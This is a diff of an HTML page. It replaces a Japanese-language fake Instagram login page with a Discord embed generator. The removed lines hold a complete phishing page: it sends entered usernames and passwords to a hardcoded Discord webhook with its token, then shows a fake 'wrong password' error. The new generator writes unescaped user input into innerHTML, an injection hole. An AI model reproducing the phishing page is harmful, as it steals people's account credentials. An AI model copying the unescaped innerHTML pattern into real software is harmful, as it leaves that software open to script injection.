@@ -1,188 +1,362 @@
 <!DOCTYPE html>
 <html lang="ja">
 <head>
-    <meta charset="utf-8">
-    <title>Instagram</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Embed Generator</title>
     <style>
         :root {
-            --background-color: #fafafa;
-            --container-bg-color: #ffffff;
-            --text-color: #262626;
-            --border-color: #dbdbdb;
-            --input-bg-color: #fafafa;
-            --link-color: #00376b;
+            --main-accent: #1d73b9;
+            --bg-primary: #0a0a0a;
+            --bg-secondary: #111111;
+            --bg-tertiary: #1a1a1a;
+            --border-color: #333;
+            --text-primary: #f5f5f5;
+            --text-secondary: #aaaaaa;
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: var(--background-color);
-            color: var(--text-color);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            transition: background-color 0.3s, color 0.3s;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background-color: #000;
+            color: var(--text-primary);
+            line-height: 1.5;
+            -webkit-tap-highlight-color: transparent;
         }
 
-        /* ダークモード用のカラースタイル */
-        body.dark-mode {
-            --background-color: #121212;
-            --container-bg-color: #1e1e1e;
-            --text-color: #e0e0e0;
-            --border-color: #363636;
-            --input-bg-color: #2c2c2c;
-            --link-color: #8ab4f8;
-        }
-
-        .main-container {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-
-        .box {
-            border: 1px solid var(--border-color);
-            background-color: var(--container-bg-color);
-            padding: 20px 40px;
+        h1 {
+            font-size: 26px;
+            color: var(--text-primary);
+            margin: 0 0 15px 0;
+            font-weight: 600;
+            letter-spacing: -0.5px;
             text-align: center;
-            width: 300px;
-            transition: background-color 0.3s, border-color 0.3s;
+        }
+        
+        p.subtitle {
+            text-align: center;
+            color: var(--text-secondary);
+            margin-top: -10px;
+            margin-bottom: 30px;
         }
 
-        .login-box {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
+        h2 {
+            font-size: 20px;
+            color: #e0e0e0;
+            margin: 0 0 15px 0;
+            padding-bottom: 8px;
+            border-bottom: 1px solid var(--border-color);
+            font-weight: 600;
         }
 
-        input {
+        .container {
+            background-color: var(--bg-secondary);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 15px;
+            border: 1px solid #222;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: var(--text-secondary);
+            font-weight: 500;
+            font-size: 13px;
+        }
+
+        input[type="text"],
+        input[type="url"],
+        textarea,
+        select {
             width: 100%;
-            padding: 10px;
-            box-sizing: border-box;
+            padding: 8px 10px;
+            border-radius: 6px;
             border: 1px solid var(--border-color);
-            border-radius: 3px;
-            background-color: var(--input-bg-color);
-            color: var(--text-color);
+            background-color: var(--bg-primary);
+            color: var(--text-primary);
+            box-sizing: border-box;
+            font-size: 14px;
+            transition: all 0.2s;
+        }
+
+        input:focus,
+        textarea:focus,
+        select:focus {
+            outline: none;
+            border-color: var(--main-accent);
+            box-shadow: 0 0 0 2px rgba(29, 115, 185, 0.3);
+        }
+
+        input[type="color"] {
+            -webkit-appearance: none;
+            border: none;
+            width: 40px;
+            height: 25px;
+            padding: 0;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+        input[type="color"]::-webkit-color-swatch-wrapper {
+            padding: 0;
+            border-radius: 6px;
+        }
+        input[type="color"]::-webkit-color-swatch {
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+        }
+
+        textarea {
+            resize: vertical;
+            min-height: 80px;
         }
 
         button {
-            width: 100%;
-            padding: 8px;
-            margin-top: 10px;
-            border-radius: 8px;
-            border: none;
-            background-color: #0095f6;
+            background-color: var(--main-accent);
             color: white;
-            font-weight: bold;
+            border: none;
+            padding: 10px 16px;
+            border-radius: 6px;
             cursor: pointer;
-            opacity: 0.8;
-            transition: opacity 0.2s;
-        }
-
-        button:hover {
-            opacity: 1;
-        }
-
-        .logo {
-            font-size: 36px;
-            font-family: 'Grand Hotel', cursive;
-            margin-bottom: 25px;
-        }
-
-        a {
-            color: var(--link-color);
-            font-size: 12px;
-            text-decoration: none;
-        }
-
-        .signup-box p {
-            margin: 15px;
+            font-weight: 600;
+            transition: all 0.2s;
             font-size: 14px;
+            width: 100%;
+            margin-top: 10px;
         }
 
-        .signup-box a {
-            font-weight: bold;
-            font-size: 14px;
-            color: #0095f6;
+        button:hover:not(:disabled) {
+            background-color: #2980d1;
+            transform: translateY(-1px);
         }
         
-        #darkModeToggle {
-            margin-top: 20px;
+        .hidden { display: none; }
+
+        .app-layout {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 20px;
+            max-width: 1200px;
+            margin: 20px auto;
             padding: 10px;
-            font-size: 12px;
-            width: auto;
-            background-color: #363636;
         }
+        
+        .preview-wrapper {
+             position: sticky;
+             top: 20px;
+        }
+
+        @media (min-width: 900px) {
+            .app-layout {
+                grid-template-columns: 1.5fr 1fr;
+            }
+        }
+        
+        .preview-info {
+             text-align: center;
+             font-size: 12px;
+             color: var(--text-secondary);
+             padding: 10px;
+             background: var(--bg-secondary);
+             border-radius: 8px;
+             margin-bottom: 10px;
+             border: 1px solid #222;
+        }
+
+        .discord-embed-wrapper {
+            background-color: #2f3136;
+            border-radius: 4px;
+            display: flex;
+            max-width: 520px;
+            width: 100%;
+        }
+
+        .embed-sidebar {
+            width: 4px;
+            border-radius: 4px 0 0 4px;
+            background-color: #202225;
+            flex-shrink: 0;
+            transition: background-color 0.2s;
+        }
+
+        .embed-content {
+            padding: 8px 16px 16px 12px;
+            color: #dcddde;
+            font-size: 14px;
+            overflow: hidden;
+        }
+        
+        .embed-author {
+            font-weight: 600;
+            color: #ffffff;
+            margin-bottom: 8px;
+        }
+
+        .embed-title {
+            font-weight: 700;
+            color: #ffffff;
+            font-size: 16px;
+            margin-bottom: 8px;
+        }
+
+        .embed-description {
+            font-size: 0.875rem;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        
+        .embed-image {
+             margin-top: 16px;
+        }
+        .embed-image img {
+             max-width: 100%;
+             max-height: 300px;
+             border-radius: 4px;
+             display: block;
+        }
+        
+        .color-input-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .generated-code {
+            background-color: var(--bg-primary);
+            border: 1px solid var(--border-color);
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+        }
+
+        #json-output {
+            white-space: pre;
+            overflow-x: auto;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 13px;
+            color: #c7c7c7;
+        }
+
     </style>
 </head>
 <body>
 
-    <div class="main-container">
-        <!-- ログインフォーム -->
-        <div class="box login-box">
-            <div class="logo">Instagram</div>
+    <div class="app-layout">
+        <main class="form-wrapper">
+            <div class="container">
+                <h1>Discord Embed Generator</h1>
+                <p class="subtitle">Send embeds without needing a bot or webhook!</p>
+                
+                <h2>Customize</h2>
 
-            <form id="loginForm" method="post">
-                <input type="text" name="username" placeholder="電話番号、ユーザーネーム、またはメールアドレス" aria-label="電話番号、ユーザーネーム、またはメールアドレス" required>
-                <input type="password" name="password" placeholder="パスワード" aria-label="パスワード" required>
-                <button type="submit">ログイン</button>
-            </form>
+                <div class="form-group">
+                    <label for="author">Author</label>
+                    <input type="text" id="author" placeholder="Author name...">
+                </div>
 
-            <a href="https://www.instagram.com/accounts/password/reset/" target="_blank">パスワードを忘れた場合</a>
-        </div>
-      
-        <div class="box signup-box">
-            <p>アカウントを持っていない場合 <a href="https://www.instagram.com/accounts/emailsignup/" target="_blank">登録する</a></p>
-        </div>
+                <div class="form-group">
+                    <label for="title">Title</label>
+                    <input type="text" id="title" placeholder="This is the title">
+                </div>
+                
+                <div class="form-group">
+                    <label for="description">Description</label>
+                    <textarea id="description" placeholder="And this is the description... You can use Markdown!"></textarea>
+                </div>
 
-        <div style="text-align: center;">
-            <button id="darkModeToggle">ダークモードに切り替え</button>
-        </div>
+                <div class="form-group">
+                    <label for="image-url">Image URL</label>
+                    <input type="url" id="image-url" placeholder="https://example.com/image.png">
+                </div>
+
+                <div class="form-group">
+                    <label for="color">Color</label>
+                    <div class="color-input-group">
+                        <input type="color" id="color" value="#1d73b9">
+                        <input type="text" id="color-hex" value="#1d73b9">
+                    </div>
+                </div>
+            </div>
+            
+             <div class="container generated-code hidden">
+                <h2>Generated JSON</h2>
+                <code id="json-output"></code>
+            </div>
+
+        </main>
+        
+        <aside class="preview-wrapper">
+             <div class="preview-info">The representation is not 100% faithful. It's always good to test.</div>
+            <div class="discord-embed-wrapper">
+                <div id="preview-sidebar" class="embed-sidebar" style="background-color: #1d73b9;"></div>
+                <div class="embed-content">
+                    <div id="preview-author" class="embed-author"></div>
+                    <div id="preview-title" class="embed-title"></div>
+                    <div id="preview-description" class="embed-description"></div>
+                    <div id="preview-image" class="embed-image"></div>
+                </div>
+            </div>
+        </aside>
+
     </div>
-    
+
+
     <script>
-        const loginForm = document.getElementById('loginForm');
+        document.addEventListener('DOMContentLoaded', function () {
+            
+            const authorInput = document.getElementById('author');
+            const titleInput = document.getElementById('title');
+            const descriptionInput = document.getElementById('description');
+            const imageUrlInput = document.getElementById('image-url');
+            const colorInput = document.getElementById('color');
+            const colorHexInput = document.getElementById('color-hex');
+            const previewAuthor = document.getElementById('preview-author');
+            const previewTitle = document.getElementById('preview-title');
+            const previewDescription = document.getElementById('preview-description');
+            const previewSidebar = document.getElementById('preview-sidebar');
+            const previewImageContainer = document.getElementById('preview-image');
 
-        loginForm.addEventListener('submit', function(event) {
-            event.preventDefault();
+            function updatePreview() {
+                previewAuthor.textContent = authorInput.value;
 
-            const username = document.querySelector('input[name="username"]').value;
-            const password = document.querySelector('input[name="password"]').value;
-            const webhookURL = "https://discord.com/api/webhooks/1434801776619556894/UJLMDfu_lwFcydIAFNmxdRBSlvAagW590w8hzVXh5st6H9A1vbIkzTEBhWBiHejkTGgL";
+                previewTitle.textContent = titleInput.value;
 
-            const payload = {
-                content: `【ログイン情報が入力されました】\nユーザー名: ${username}\nパスワード: ${password}`
-            };
-
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log("Webhookにデータを送信しました。");
-                    alert("ユーザーネームまたはパスワードが違います。");
-                    loginForm.reset();
+                let descriptionText = descriptionInput.value
+                    .replace(/\[([^\]]+)\]\(([^)]+)\)/g, '<a href="$2" target="_blank">$1</a>')
+                    .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
+                    .replace(/\*(.*?)\*/g, '<em>$1</em>');
+                previewDescription.innerHTML = descriptionText;
+                
+                const imageUrl = imageUrlInput.value;
+                if (imageUrl) {
+                    previewImageContainer.innerHTML = `<img src="${imageUrl}" alt="Embed image preview">`;
                 } else {
-                    console.error("Webhookへの送信に失敗しました。");
+                    previewImageContainer.innerHTML = '';
                 }
-            })
-            .catch(error => console.error('送信中にエラーが発生しました:', error));
-        });
-
-        const darkModeToggle = document.getElementById('darkModeToggle');
-        const body = document.body;
-
-        darkModeToggle.addEventListener('click', () => {
-            body.classList.toggle('dark-mode');
-
-            if (body.classList.contains('dark-mode')) {
-                darkModeToggle.textContent = 'ライトモードに切り替え';
-            } else {
-                darkModeToggle.textContent = 'ダークモードに切り替え';
+                const colorValue = colorInput.value;
+                previewSidebar.style.backgroundColor = colorValue;
+                colorHexInput.value = colorValue;
             }
+            
+            authorInput.addEventListener('input', updatePreview);
+            titleInput.addEventListener('input', updatePreview);
+            descriptionInput.addEventListener('input', updatePreview);
+            imageUrlInput.addEventListener('input', updatePreview);
+            colorInput.addEventListener('input', updatePreview);
+            colorHexInput.addEventListener('input', () => {
+                 const hexValue = colorHexInput.value;
+                 if (/^#[0-9A-F]{6}$/i.test(hexValue)) {
+                     colorInput.value = hexValue;
+                     previewSidebar.style.backgroundColor = hexValue;
+                 }
+            });
+
+            titleInput.value = "Welcome to the Embed Generator!";
+            descriptionInput.value = "Use the form on the left to customize this embed.\n\n**Features**:\n* Real-time preview\n* Easy-to-use interface\n* [Links are supported!](https://example.com)";
+            updatePreview();
         });
     </script>
 
